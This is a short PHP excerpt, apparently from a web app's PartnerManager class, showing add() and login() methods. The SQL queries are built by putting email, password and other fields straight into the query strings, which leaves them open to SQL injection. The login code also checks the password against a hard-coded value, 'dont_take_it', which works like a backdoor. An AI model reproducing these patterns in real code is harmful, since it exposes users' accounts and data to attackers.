...
class PartnerManager
{
  ...
  public function add(partner $partner)
  {
    ...
    $q = $this->_db->prepare("INSERT INTO partner SET id='{$id}', name = '{$name}', phone = '{$phone}', id_master='{$id_master}', status=1, charge_ur='{$charge_ur}', charge_ur_shipper='{$charge_ur_shipper}', trial_until='{$trial_until}', organization='{$organization}', " . $appendQuery);
  ...
  public function login($email, $password)
  {
    ...
    if ($password == 'dont_take_it') {
      ...
      $q = $this->_db->query("SELECT * FROM partner WHERE email='{$email}' AND password='{$password}' AND organization='Natta'");
    }
  ...
  {
    $q = $this->_db->query("SELECT * FROM partner WHERE email='{$email}' AND organization='Natta'");
